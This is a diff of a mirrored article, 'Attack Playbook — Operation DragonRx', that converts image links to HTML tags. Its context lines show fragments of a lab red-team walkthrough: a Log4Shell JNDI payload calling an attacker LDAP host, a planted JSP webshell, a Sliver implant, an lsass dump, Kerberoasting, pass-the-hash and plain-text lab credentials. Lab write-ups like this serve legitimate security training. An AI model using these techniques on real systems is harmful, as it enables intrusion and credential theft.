@@ -7,7 +7,7 @@ image: "https://cdn-images-1.medium.com/max/800/1*lV1WVIi1LxoFQUkvjpPdxQ.png"
 # Attack Playbook — Operation DragonRx
 
 
-![Cover image](https://cdn-images-1.medium.com/max/800/1*lV1WVIi1LxoFQUkvjpPdxQ.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*lV1WVIi1LxoFQUkvjpPdxQ.png" alt="Cover image" width="2752" height="1536" loading="eager" fetchpriority="high" decoding="async" />
 
 :::info Article Metadata
 - **Category:** CTI
@@ -23,7 +23,7 @@ This page mirrors the original Medium article into the 1200km.com Docusaurus eco
 
 ### Phase-by-Phase Attack Guide: Exact Commands Against the Deployed Lab
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*lV1WVIi1LxoFQUkvjpPdxQ.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*lV1WVIi1LxoFQUkvjpPdxQ.png" alt="Article image" width="2752" height="1536" loading="lazy" decoding="async" />
 
 ## Operation DragonRx series:
 
@@ -50,7 +50,7 @@ This page mirrors the original Medium article into the 1200km.com Docusaurus eco
 
 **Operator perspective:**Most commands run from the Kali Docker container. A few use`docker`CLI commands that must run on the**host machine**(not inside Kali — Docker is not installed in the container).**Lab shell notation:**
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*_xjc0nVgY-E3lcBcSXn-yQ.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*_xjc0nVgY-E3lcBcSXn-yQ.png" alt="Article image" width="1672" height="941" loading="lazy" decoding="async" />
 
 - `[HOST]`— your host terminal (outside any container) — use for`docker logs`,`docker exec`,`make`
 
@@ -143,15 +143,15 @@ make shell
 # Navigate to: Security → Alerts
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*-qC-szV80rueDR09Lj3n4w.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*-qC-szV80rueDR09Lj3n4w.png" alt="Article image" width="936" height="133" loading="lazy" decoding="async" />
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*yQl5eMDbXD37DxhApDiCRA.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*yQl5eMDbXD37DxhApDiCRA.png" alt="Article image" width="1901" height="658" loading="lazy" decoding="async" />
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*BQPT-6EF9H0ybDP0GmRm4w.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*BQPT-6EF9H0ybDP0GmRm4w.png" alt="Article image" width="878" height="111" loading="lazy" decoding="async" />
 
 ## Network Reference Card
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*rPbukQkgMdT8eZRgTzQ0QA.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*rPbukQkgMdT8eZRgTzQ0QA.png" alt="Article image" width="1672" height="941" loading="lazy" decoding="async" />
 
 ```text
 ATTACKER NETWORK  
@@ -383,7 +383,7 @@ nmap -sV -sC -p 8080 10.0.0.100 -oA /opt/loot/recon/web01_scan
 
 **Expected output:**
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*VSzYwTcy3BMkPOCyO7CG4Q.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*VSzYwTcy3BMkPOCyO7CG4Q.png" alt="Article image" width="1265" height="268" loading="lazy" decoding="async" />
 
 ```text
 PORT     STATE SERVICE VERSION
@@ -402,7 +402,7 @@ tee
 
 **Expected — JSON API, no HTML:**
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*x6uBi2BZVBJ_YuGw8XxF4A.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*x6uBi2BZVBJ_YuGw8XxF4A.png" alt="Article image" width="707" height="831" loading="lazy" decoding="async" />
 
 ```text
 WhatWeb
@@ -703,7 +703,7 @@ grep
 
 **Expected:**
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*6fy2CfaLSgOdYqOHK1uX6Q.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*6fy2CfaLSgOdYqOHK1uX6Q.png" alt="Article image" width="1165" height="122" loading="lazy" decoding="async" />
 
 ```text
 Content-Type: application/json;charset=UTF-8
@@ -736,7 +736,7 @@ grep
 
 **Expected:**
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*UqFVLRiutG4yAtfO_RFcNw.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*UqFVLRiutG4yAtfO_RFcNw.png" alt="Article image" width="1165" height="122" loading="lazy" decoding="async" />
 
 ```text
 < HTTP/1.1 200 
@@ -775,7 +775,7 @@ tail
 
 **Expected:**
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*mZnqhA7XWinznk7_qGLoZQ.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*mZnqhA7XWinznk7_qGLoZQ.png" alt="Article image" width="1153" height="169" loading="lazy" decoding="async" />
 
 ```text
 [*] Compiling Exploit.
@@ -828,7 +828,7 @@ curl -s http:
 'X-Api-Version: ${jndi:ldap://10.0.0.20:1389/test}'
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*RSvIARasSlBxrT27MHhlgg.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*RSvIARasSlBxrT27MHhlgg.png" alt="Article image" width="1239" height="117" loading="lazy" decoding="async" />
 
 ```text
 [HOST]
@@ -839,7 +839,7 @@ tail
 # Expected: "Received connection from 192.168.10.100" or similar
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*0lVJ2Pqj8kY2iUaGqBjYVA.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*0lVJ2Pqj8kY2iUaGqBjYVA.png" alt="Article image" width="1153" height="169" loading="lazy" decoding="async" />
 
 ### 1.2 Get the Reverse Shell
 
@@ -881,7 +881,7 @@ curl -s http:
 
 **Back in Terminal 1 — shell appears within 2–3 seconds:**
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*X_wXMQje7mSKzCn_u1XQMA.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*X_wXMQje7mSKzCn_u1XQMA.png" alt="Article image" width="821" height="139" loading="lazy" decoding="async" />
 
 ```text
 connect
@@ -931,7 +931,7 @@ hostname
 # web01
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*kamxeBkXUW4QJxL2Ui99RA.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*kamxeBkXUW4QJxL2Ui99RA.png" alt="Article image" width="462" height="241" loading="lazy" decoding="async" />
 
 &gt; The container runs as root . Ubuntu 22.04 — bash available, Python not installed.
 
@@ -1003,7 +1003,7 @@ exec
 # Expected: trustURLCodebase=true
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*TqaQDg91ulFfPVkTMu7luA.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*TqaQDg91ulFfPVkTMu7luA.png" alt="Article image" width="1055" height="499" loading="lazy" decoding="async" />
 
 ```text
 [KALI]
@@ -1027,7 +1027,7 @@ class
 data
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*NXPfpMRADnKn4u5rJWgtnw.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*NXPfpMRADnKn4u5rJWgtnw.png" alt="Article image" width="1266" height="77" loading="lazy" decoding="async" />
 
 ## Phase 2: Foothold — Webshell + Implant
 
@@ -1076,7 +1076,7 @@ ls
 # META-INF/  WEB-INF/  index.jsp
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*VJkuSCaKNhUGBE8aEc9DXQ.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*VJkuSCaKNhUGBE8aEc9DXQ.png" alt="Article image" width="740" height="68" loading="lazy" decoding="async" />
 
 ```text
 [WEB01]
@@ -1128,7 +1128,7 @@ curl -s
 "http://10.0.0.100:8080/resources/imgs/cache.jsp?c=id%3Bwhoami%3Bhostname"
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*VxvavLmhd0KtlNjrYNS5jA.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*VxvavLmhd0KtlNjrYNS5jA.png" alt="Article image" width="1063" height="138" loading="lazy" decoding="async" />
 
 **Expected:**
 
@@ -1163,7 +1163,7 @@ exec
  -it dragonrx_c2 sliver
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*HROTDZtBeYXeBJUv0iNgHw.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*HROTDZtBeYXeBJUv0iNgHw.png" alt="Article image" width="932" height="426" loading="lazy" decoding="async" />
 
 ```text
 sliver > http --lhost 10.0.0.10 --lport 80
@@ -1182,7 +1182,7 @@ arch
 # [*] Implant saved to /opt/loot/dragonrx_beacon
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*7b_jk3A1J1X-MBQ9FOSfjg.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*7b_jk3A1J1X-MBQ9FOSfjg.png" alt="Article image" width="641" height="321" loading="lazy" decoding="async" />
 
 **Step 2 — Copy beacon to Kali’s staging directory (run from host):**
 
@@ -1194,7 +1194,7 @@ cp
     ./attacker/tools/rxphage/dragonrx_beacon
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*9cuxR2KstOgYQm5NbGfbxA.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*9cuxR2KstOgYQm5NbGfbxA.png" alt="Article image" width="1568" height="105" loading="lazy" decoding="async" />
 
 **Step 3 — Start the staging HTTP server on Kali:**
 
@@ -1211,9 +1211,9 @@ ls
 # dragonrx_beacon  rxphage  rxphage.exe
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*26emybcKXHL7uCW8ZaCC4A.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*26emybcKXHL7uCW8ZaCC4A.png" alt="Article image" width="1226" height="81" loading="lazy" decoding="async" />
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*yfcvhgja74yOAftLQV1-_g.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*yfcvhgja74yOAftLQV1-_g.png" alt="Article image" width="1226" height="81" loading="lazy" decoding="async" />
 
 **Step 4 — Download and run on web01:**
 
@@ -1240,7 +1240,7 @@ C2
 sliver > beacons
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*-iqo7FYUjlpYobV8pR7Qeg.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*-iqo7FYUjlpYobV8pR7Qeg.png" alt="Article image" width="1911" height="228" loading="lazy" decoding="async" />
 
 **Expected:**
 
@@ -1303,11 +1303,11 @@ sliver (dragonrx_beacon) > execute -o -- /bin/bash -c
 # Note: beacon commands are async - output arrives on the next check-in (~30s)
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*zFmvTLA_BC2BwlAtXvITQw.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*zFmvTLA_BC2BwlAtXvITQw.png" alt="Article image" width="1911" height="228" loading="lazy" decoding="async" />
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*fsmYXTpWdBs2Bj58otnOSw.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*fsmYXTpWdBs2Bj58otnOSw.png" alt="Article image" width="584" height="879" loading="lazy" decoding="async" />
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*5wJ7uuFE9KNZhcn1LOrEIA.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*5wJ7uuFE9KNZhcn1LOrEIA.png" alt="Article image" width="498" height="704" loading="lazy" decoding="async" />
 
 **SIEM alert fired:**
 
@@ -1327,7 +1327,7 @@ file /opt/tools/rxphage/rxphage
 # ELF 64-bit LSB executable, x86-64, statically linked, stripped
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*BpDNy8S7tEkok_JlRyJhng.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*BpDNy8S7tEkok_JlRyJhng.png" alt="Article image" width="1911" height="228" loading="lazy" decoding="async" />
 
 ```text
 [WEB01]
@@ -1336,7 +1336,7 @@ chmod
  +x /tmp/.cache/rxphage
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*r5gE4t7nnC3iQtTzmuQLBA.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*r5gE4t7nnC3iQtTzmuQLBA.png" alt="Article image" width="752" height="173" loading="lazy" decoding="async" />
 
 ```text
 file /tmp/.cache/rxphage
@@ -1356,7 +1356,7 @@ echo
 "RxPhage PID: $!"
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*ukYswzIC7ozwsvBnPtnQIg.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*ukYswzIC7ozwsvBnPtnQIg.png" alt="Article image" width="1920" height="513" loading="lazy" decoding="async" />
 
 **Verify both implants are running:**
 
@@ -1374,7 +1374,7 @@ grep
 # root  1079  rxphage
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*nWRzmPII377r4O-CoIICsg.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*nWRzmPII377r4O-CoIICsg.png" alt="Article image" width="853" height="81" loading="lazy" decoding="async" />
 
 **SIEM alerts fired:**
 
@@ -1430,7 +1430,7 @@ cat
  /etc/hosts
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*hMX-FUuY89W4jj-tCKouTw.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*hMX-FUuY89W4jj-tCKouTw.png" alt="Article image" width="1025" height="493" loading="lazy" decoding="async" />
 
 ### 3.2 Internal Network Sweep
 
@@ -1734,7 +1734,7 @@ done
  seconds
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*dqAuiDj93H79STewJDYOqw.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*dqAuiDj93H79STewJDYOqw.png" alt="Article image" width="1340" height="955" loading="lazy" decoding="async" />
 
 **Assessment:**
 
@@ -1768,7 +1768,7 @@ sort
 
 **Expected — credentials in plain text:**
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*STdM5DhmvB1CKqp6yCD2Bg.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*STdM5DhmvB1CKqp6yCD2Bg.png" alt="Article image" width="1918" height="381" loading="lazy" decoding="async" />
 
 ```text
 DOMAIN_CONTROLLER
@@ -1839,7 +1839,7 @@ grep
 /dev/null
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*V_F1GYLGnWJReQvoBWRLQg.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*V_F1GYLGnWJReQvoBWRLQg.png" alt="Article image" width="1870" height="305" loading="lazy" decoding="async" />
 
 **CRITICAL FIND:**`svc_ldap / NovaTech2021!`— valid Active Directory service account. This single credential opens the entire AD directory for enumeration from this Linux container.
 
@@ -1879,7 +1879,7 @@ grep
 "^sAMAccountName|^description|^department"
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*Se0bsjVh_ltzViJt0s0mbA.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*Se0bsjVh_ltzViJt0s0mbA.png" alt="Article image" width="1577" height="383" loading="lazy" decoding="async" />
 
 **Expected:**
 
@@ -1926,7 +1926,7 @@ x
 /dev/null
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*sepg4d4ZWXyasw3p6GY3vg.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*sepg4d4ZWXyasw3p6GY3vg.png" alt="Article image" width="1577" height="383" loading="lazy" decoding="async" />
 
 **Expected:**`member: CN=Administrator,CN=Users,DC=novatech,DC=local`
 
@@ -1965,7 +1965,7 @@ grep
 
 **Expected:**
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*NPhR6mnjG2IUA2ebEe-nxw.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*NPhR6mnjG2IUA2ebEe-nxw.png" alt="Article image" width="1321" height="936" loading="lazy" decoding="async" />
 
 ```text
 sAMAccountName: svc_backup
@@ -2013,7 +2013,7 @@ cat
 
 **Expected:**
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*zi4LVyvZEv7puv2nq_KlJg.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*zi4LVyvZEv7puv2nq_KlJg.png" alt="Article image" width="1920" height="708" loading="lazy" decoding="async" />
 
 ```text
 ServicePrincipalName                  Name        MemberShip           PasswordLastSet  LastLogon
@@ -2056,14 +2056,14 @@ print('OK:', fixed[:60])
 hashcat -m 19700 /tmp/hash_fixed.txt /usr/share/wordlists/rockyou.txt -o /opt/loot/kerberoast_cracked.txt --force
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*HvTmCYCU45tHrajxHxfUoA.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*HvTmCYCU45tHrajxHxfUoA.png" alt="Article image" width="1870" height="807" loading="lazy" decoding="async" />
 
 ```text
 # Show result
 cat /opt/loot/kerberoast_cracked.txt
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*3CdGm8gM1XfIXWxiDkWeng.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*3CdGm8gM1XfIXWxiDkWeng.png" alt="Article image" width="1907" height="317" loading="lazy" decoding="async" />
 
 **Expected:**
 
@@ -2096,7 +2096,7 @@ impacket-smbclient
 
 **Expected:**
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*dFL_k_sgFNhY0fhJTWEmqg.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*dFL_k_sgFNhY0fhJTWEmqg.png" alt="Article image" width="1231" height="252" loading="lazy" decoding="async" />
 
 ```text
 [
@@ -2108,7 +2108,7 @@ impacket-secretsdump
 
 **Expected output:**
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*eNeQnmOTgJ7JFsKSp3NLuQ.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*eNeQnmOTgJ7JFsKSp3NLuQ.png" alt="Article image" width="1913" height="850" loading="lazy" decoding="async" />
 
 ```text
 ....
@@ -2226,7 +2226,7 @@ dir C:\Temp\lsass.dmp
 
 **Expected:**
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*X3kDik7rK2fswzjwBIXyZQ.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*X3kDik7rK2fswzjwBIXyZQ.png" alt="Article image" width="1694" height="505" loading="lazy" decoding="async" />
 
 ```text
 Volume 
@@ -2280,7 +2280,7 @@ pypykatz lsa minidump /opt/loot/lsass.dmp 2>/dev/null | grep -A 6
 
 **Expected:**
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*RfsDsMzxuvjxAvh13njEug.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*RfsDsMzxuvjxAvh13njEug.png" alt="Article image" width="1001" height="874" loading="lazy" decoding="async" />
 
 ```text
 == MSV ==
@@ -2291,7 +2291,7 @@ NT: <jsmith_ntlm>   ← NTLM hash for jsmith
 SHA1: <sha1>
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*h09E10Jjh5aF2jrOYObSbw.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*h09E10Jjh5aF2jrOYObSbw.png" alt="Article image" width="1895" height="796" loading="lazy" decoding="async" />
 
 &gt; Note: WDigest credential caching is disabled by default on Windows 10 / Server 2016+. Expect NTLM hashes only — no cleartext passwords unless WDigest was explicitly re-enabled. HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential = 1 enables it.
 
@@ -2319,7 +2319,7 @@ crackmapexec smb 192.168.10.50 \
 
 **Expected:**
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*DbDLVEs11QYQRaVaWrF5QQ.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*DbDLVEs11QYQRaVaWrF5QQ.png" alt="Article image" width="1844" height="209" loading="lazy" decoding="async" />
 
 ```text
 SMB
@@ -2386,7 +2386,7 @@ crackmapexec smb 192.168.10.50 -u jsmith -p
 'Research#2024'
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*2Mmle06kPuwm2gYnnRzAiA.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*2Mmle06kPuwm2gYnnRzAiA.png" alt="Article image" width="917" height="248" loading="lazy" decoding="async" />
 
 ```text
 [*]
@@ -2462,7 +2462,7 @@ ${ADMIN_NTLM}
 
 **Expected — hash works on DC01 and WS01:**
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*Glw2BNV6ddAmcx7nPkY4xQ.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*Glw2BNV6ddAmcx7nPkY4xQ.png" alt="Article image" width="1632" height="153" loading="lazy" decoding="async" />
 
 ```text
 SMB  
@@ -2513,7 +2513,7 @@ svc_backup:
 .10
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*n-41suFk79oUCPcr4xWpnQ.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*n-41suFk79oUCPcr4xWpnQ.png" alt="Article image" width="1901" height="831" loading="lazy" decoding="async" />
 
 **Expected:**
 
@@ -2574,7 +2574,7 @@ impacket-smbexec novatech.local/administrator:
 @192.168.10.50
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*U-fcB_Up7Gs3jLAA073hvQ.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*U-fcB_Up7Gs3jLAA073hvQ.png" alt="Article image" width="931" height="211" loading="lazy" decoding="async" />
 
 ## Phase 6: Collection
 
@@ -2642,9 +2642,9 @@ impacket-smbclient novatech.local/administrator:
 
 **Expected on FS01 (provisioned by Ansible):**
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*bjOgHu8Vb5v2g3RrAZ34Vg.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*bjOgHu8Vb5v2g3RrAZ34Vg.png" alt="Article image" width="442" height="869" loading="lazy" decoding="async" />
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*dVT-2wFDA-NG4_kBYoymtQ.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*dVT-2wFDA-NG4_kBYoymtQ.png" alt="Article image" width="1770" height="326" loading="lazy" decoding="async" />
 
 ```text
 [DC01]
@@ -2736,7 +2736,7 @@ sleep
 # [*] Beacon sleep set to 0s (interactive mode)
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*KP_z6S1SFarvaHCU-VmapA.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*KP_z6S1SFarvaHCU-VmapA.png" alt="Article image" width="1164" height="786" loading="lazy" decoding="async" />
 
 ```text
 [C2]
@@ -3166,7 +3166,7 @@ rmdir
 
 ## Kill Chain Summary
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*ksX6V1vqfWkbgxY2ifLQ3Q.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*ksX6V1vqfWkbgxY2ifLQ3Q.png" alt="Article image" width="1672" height="941" loading="lazy" decoding="async" />
 
 ```text
 INITIAL
@@ -3314,7 +3314,7 @@ Day
 
 ## Loot Summary
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*dtqmh_flUlhYyVc-PojmfQ.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*dtqmh_flUlhYyVc-PojmfQ.png" alt="Article image" width="1672" height="941" loading="lazy" decoding="async" />
 
 ```text
 /opt/loot/
@@ -3345,7 +3345,7 @@ zip
 
 ## Destroy the lab
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*vzRY1smx6_mrS9bgQBg9EQ.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*vzRY1smx6_mrS9bgQBg9EQ.png" alt="Article image" width="686" height="917" loading="lazy" decoding="async" />
 
 ## Follow for practical cybersecurity research
 
